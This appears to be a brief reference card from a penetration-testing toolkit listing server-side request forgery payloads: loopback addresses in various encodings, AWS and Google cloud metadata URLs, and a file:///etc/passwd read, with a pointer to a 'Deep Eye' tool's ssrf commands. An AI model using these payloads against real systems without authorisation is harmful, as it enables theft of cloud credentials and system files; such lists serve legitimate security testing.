# SSRF Payload Pack

**Trigger condition:** Manual SSRF / cloud metadata tests.

## Key Payloads
```
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://[::1]/
http://2130706433/
file:///etc/passwd
```

## Tools Available
| Tool | Command | Purpose |
|------|---------|---------|
| Deep Eye | `ssrf`, `ssrf_cloud` | Auto |
